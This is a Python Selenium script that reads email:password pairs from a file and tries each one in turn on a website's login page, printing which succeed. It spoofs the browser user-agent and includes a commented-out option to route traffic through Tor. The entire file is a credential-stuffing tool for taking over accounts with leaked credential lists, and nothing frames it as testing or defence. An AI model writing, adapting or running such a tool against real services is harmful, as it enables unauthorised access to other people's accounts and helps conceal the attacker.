from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.chrome.options import Options
import sys, time

login = "https://<url>/u/login"
home = "https://<url>/"
logout = "https://<url>/auth/logout"		

def interceptor(request):
	request.headers["user-agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

chrome_options = webdriver.ChromeOptions()
#chrome_options.add_argument("--headless=new") # CLI / UI
#chrome_options.add_argument("--proxy-server=socks5://127.0.0.1:9050") # Proxy (TOR)
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=chrome_options)
chrome_options = Options()

driver.get(login)
driver.request_interceptor = interceptor

# driver.get(home)
# time.sleep(1)
# driver.find_element(By.XPATH,"//a[contains(@class,'MyHB-module_container__')]").click()

eml = list()
pwd = list()
with open('userpass.txt', 'r') as epList:
    for line in epList:
        email, passwd = line.strip().split(':')
        eml.append(email)
        pwd.append(passwd)
		
def	loginuserpass(e,p):
	m=driver.current_url
	username = driver.find_element(By.NAME,"username")
	username.clear()
	print("username: ", eml[i])
	username.send_keys(eml[i])
	password = driver.find_element(By.NAME,"password")
	password.clear()
	print("password: ", pwd[i])
	password.send_keys(pwd[i])
	driver.find_element(By.NAME,"action").click()

	if driver.current_url == home:
	   	print("Successfully logged in!\n==================================================")
	   	time.sleep(1)
	   	driver.get(logout)
	   	driver.get(login)
	else:
		#time.sleep(1000000)
		try:
		    err = driver.find_element(By.XPATH,"//div[contains(@id,'prompt-alert')]")
		    print((driver.find_element(By.XPATH,"//div[contains(@id,'prompt-alert')]")).text+"\n==================================================")
		except NoSuchElementException:
		    print((driver.find_element(By.XPATH,"//span[contains(@id,'error-element-password')]")).text+"\n==================================================")


for i in range(len(eml)):
	loginuserpass(eml[i],pwd[i])
	i+=1
